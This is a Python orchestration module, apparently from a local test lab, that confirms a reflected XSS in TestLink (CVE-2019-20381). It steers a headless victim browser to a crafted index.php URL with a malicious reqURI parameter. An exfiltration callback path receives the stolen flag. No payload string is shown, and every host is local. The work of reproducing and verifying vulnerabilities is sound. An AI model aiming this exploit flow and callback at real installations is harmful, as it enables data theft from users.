#!/usr/bin/env python3
"""Shared orchestration for the testlink-cve-2019-20381 xss-exfil canary.

One "probe" = (1) reset the callback, (2) drive the headless victim to VISIT the attacker's crafted
`index.php?...&reqURI=<payload>&...` URL on the target version, (3) read the callback. The observable
result is the callback dump; the per-run ${PCB_FLAG} appears there IFF the reflected reqURI produced
an executable `javascript:` iframe src that FIRED in the victim (proving execution, not reflection).

This is a REFLECTED XSS -> the payload is carried in the URL, nothing is stored.
"""
import urllib.parse
import urllib.request

# Host-published ports (oracle/PoCs run on the host).
HOST_APP = {
    "v0": "http://127.0.0.1:34520",
    "v1": "http://127.0.0.1:34521",
    "v2": "http://127.0.0.1:34522",
}
# Internal compose URLs the victim browser uses (Docker DNS by service name).
INTERNAL_APP = {"v0": "http://v0", "v1": "http://v1", "v2": "http://v2"}
VICTIM = "http://127.0.0.1:34570"
CALLBACK = "http://127.0.0.1:34590"

# Internal callback the exfil payload navigates the iframe to. Protocol-relative -> resolves to
# http on the victim page; single-quoted in JS so it survives the double-quoted iframe src="...".
CB = "//callback:9000/c?f="


def _get(url, timeout=120):
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def _target_url(base, payload):
    # Faithful to ExploitDB 47702: index.php?caller=login&reqURI=<payload>&viewer=3
    q = urllib.parse.urlencode(
        {"caller": "login", "reqURI": payload, "viewer": "3"}
    )
    return base + "/index.php?" + q


def run_payload(payload: str, version: str) -> str:
    """Drive the victim to visit the crafted reqURI URL on `version`; return the callback dump."""
    _get(CALLBACK + "/reset")
    target = _target_url(INTERNAL_APP[version], payload)
    origin = INTERNAL_APP[version]
    q = urllib.parse.urlencode({"target": target, "origin": origin})
    _get(VICTIM + "/visit?" + q)
    return _get(CALLBACK + "/dump")
